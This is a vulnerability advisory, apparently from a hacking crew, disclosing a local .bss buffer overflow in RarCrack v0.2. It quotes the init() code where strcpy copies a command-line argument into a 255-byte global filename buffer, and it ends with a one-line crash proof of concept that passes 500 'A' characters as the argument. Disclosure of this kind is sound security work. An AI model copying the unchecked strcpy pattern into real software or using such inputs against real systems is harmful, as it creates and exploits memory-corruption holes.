@@ -1,0 +1,113 @@
+The software can be downloaded here: http://rarcrack.sourceforge.net/
+# Author: stoke
+# Date: 2010-09-20
+# Download: http://rarcrack.sourceforge.net/
+# Tested on: Backtrack 4
+
+#############################
+
+Site: http://devilcode.it | http://hack2web.altervista.org
+
+Special greetz to: nex, for reassure me when i sayed "WHY EIP IT'S NOT CHANGED!!!!!!!?!!!"
+
+ ____                      ___              __      __                                              
+/\  _`\                 __/\_ \           /'__`\   /\ \                                             
+\ \ \/\ \    __  __  __/\_\//\ \     ___ /\ \/\ \  \_\ \     __         ___  _ __   __  __  __  __  
+ \ \ \ \ \ /'__`\\ \/\ \/\ \\ \ \   /'___\ \ \ \ \ /'_` \  /'__`\      /'___\\`'__\'__`\\ \/\ \/\ \ 
+  \ \ \_\ \\  __/ \ \_/ | \ \\_\ \_/\ \__/\ \ \_\ \\ \L\ \/\  __/     /\ \__/ \ \/\  __/ \ \_/ \_/ \
+   \ \____/ \____\ \___/ \ \_\\____\ \____\\ \____/ \___,_\ \____\    \ \____\ \_\ \____\ \___x___/'
+    \/___/ \/____/\/__/   \/_//____/\/____/ \/___/ \/__,_ /\/____/     \/____/\/_/\/____/\/__//__/  
+
+Crew Members: bl3ck, stoke, Shellcoder_, n1md4, sys.x4sh, Ax3L, s1y, LostPassword, nex & overmind
+
+
+
+############################
+RarCrack v0.2 bss overflow PoC
+
+
+###########################################
+Function affected: init();
+
+Type: local;
+
+Variable overflowed:  filename;
+###########################################
+
+########################################################
+
+Here we have:
+
+----- Start useful code snip --------
+char filename[255];
+----- End useful code snip ----------
+
+This variable is above the "main" function, so is global and allocated on .bss.
+
+In init() function we have:
+---- Start useful code snip ----
+
+			if (strcmp(argv[i],"--help") == 0) {
+				printf("Usage:   rarcrack encrypted_archive.ext [--threads NUM] [--type rar|zip|7z]\n\n");
+				printf("Options: --help: show this screen.\n");
+				printf("         --type: you can specify the archive program, this needed when\n");
+				printf("                 the program couldn't detect the proper file type\n");
+				printf("         --threads: you can specify how many threads\n");
+				printf("                    will be run, maximum 12 (default: 2)\n\n");
+				printf("Info:    This program supports only RAR, ZIP and 7Z encrypted archives.\n");
+				printf("         RarCrack! usually detects the archive type.\n\n");
+				help = 1;
+				break;	
+			} else if (strcmp(argv[i],"--threads") == 0) {
+				if ((i + 1) < argc) {
+					sscanf(argv[++i], "%d", &threads);
+					if (threads < 1) threads = 1;
+					if (threads > 12) {
+						printf("INFO: number of threads adjusted to 12\n");
+						threads = 12;
+					}
+				} else {
+					printf("ERROR: missing parameter for option: --threads!\n");
+					help = 1;
+				}
+			} else if (strcmp(argv[i],"--type") == 0) {
+				if ((i + 1) < argc) {
+					sscanf(argv[++i], "%s", &test);
+					for (j = 0; strcmp(TYPE[j], "") != 0; j++) {
+						if (strcmp(TYPE[j], test) == 0) {
+							strcpy(finalcmd, CMD[j]);
+							archive_type = j;
+							break;
+						}
+					}
+					if (archive_type < 0) {
+						printf("WARNING: invalid parameter --type %s!\n", argv[i]);
+						finalcmd[0] = '\0';
+					}
+				} else {
+					printf("ERROR: missing parameter for option: --type!\n");
+					help = 1;
+				}
+			} else {
+				strcpy((char*)&filename, argv[i]);
+
+---- Stop useful code snip ----
+
+How you can see, at the end of this code we have a strcpy to our "filename" variable, so, if you put more than 255 bytes in an argv, you will have a Segmentation Fault.
+
+###########################################################################
+
+
+###########################################################################
+PoC
+
+
+./rarcrack `perl -e 'print "A" x500'`
+
+
+###########################################################################
+
+
+
+
+      
